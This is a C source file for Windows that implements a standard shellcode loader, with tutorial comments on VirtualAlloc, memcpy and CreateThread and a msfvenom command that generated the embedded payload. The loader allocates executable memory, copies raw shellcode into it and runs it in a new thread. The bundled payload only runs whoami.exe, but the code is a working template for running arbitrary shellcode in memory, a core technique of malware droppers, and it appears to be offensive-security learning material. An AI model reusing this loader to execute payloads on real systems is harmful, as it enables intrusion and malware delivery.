#include <Windows.h>
#include <stdio.h>

// Notes:
// Standard Shellcode Loader
// Loads Unencrypted Shellcode into memory by assigning shellcode into a variable
// Creates a memory space for the unencrypted shellcode to be. This step is necessary as the default memory location for the assigned variable is .data which is not executable
// Memory can be allocated using VirtualAlloc
//
// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
//
// LPVOID VirtualAlloc(
//  [in, optional] LPVOID lpAddress,
//  	^ If NULL, the system will define a block
//  [in]           SIZE_T dwSize,
//  	^ sizeof(shellcode)
//  [in]           DWORD  flAllocationType,
//  	^ MEM_COMMIT
//  [in]           DWORD  flProtect
//  	^ PAGE_EXECUTE_READWRITE is what is needed to ensure we can write to the allocated memory and then execute it
//);
//
// With the memory allocated the shellcode will need to be copied into the new memory space
//
// This can be accomplished with memcpy
//
// void * memcpy ( void * destination, const void * source, size_t num );
//
// memcpy(shellmem, shellcode, sizeof(shellcode))
//
// With the shellcode copied a thread can be created to run the shellcode in memory
//
// HANDLE CreateThread(
//  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
//   ^^ optional so NULL
//  [in]            SIZE_T                  dwStackSize,
//   ^^ The initial size of the stack, in bytes. The system rounds this value to the nearest page. If this parameter is zero, the new thread uses the default size for the executable. For more information, see Thread Stack Size.
//  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
//   ^^ shellmem
//  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
//  ^^ optional so NULL
//  [in]            DWORD                   dwCreationFlags,
//  
// 0 = The thread runs immediately after creation.
//  [out, optional] LPDWORD                 lpThreadId
//  ^^ optional so NULL
//);
//
// WaitForSingle(thingtowaitfor,INFINITE);
//
// msfvenom -p windows/x64/exec CMD=whoami.exe -f c -v shellcode

unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x77\x68\x6f\x61\x6d\x69\x2e\x65\x78\x65\x00";

int main(){
	// Allocate memory with VirtualAlloc as per the notes above and store the returned memory location in the shellmem variable
	LPVOID shellmem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Ensure that memory was correctly allocated
	if(shellmem == NULL){
		printf("[#] Issue allocating memory\n");
	}else{
		printf("[#] Memory allocated at %p\n", &shellmem);
	}

	// the shellcode from the shellcode variable will need to be placed into the allocated memory
	memcpy(shellmem, shellcode, sizeof(shellcode));

	HANDLE thread = CreateThread(NULL, 0, shellmem, NULL, 0, NULL);

	if(thread == NULL){
		printf("[#] Issue creating thread\n");
	}else{
		printf("[#] Thread created");
	}
	// WaitForSingleObject to let thread run
	WaitForSingleObject(thread,INFINITE);

	// getchar() so you hit enter
	getchar();

	return 69;
}
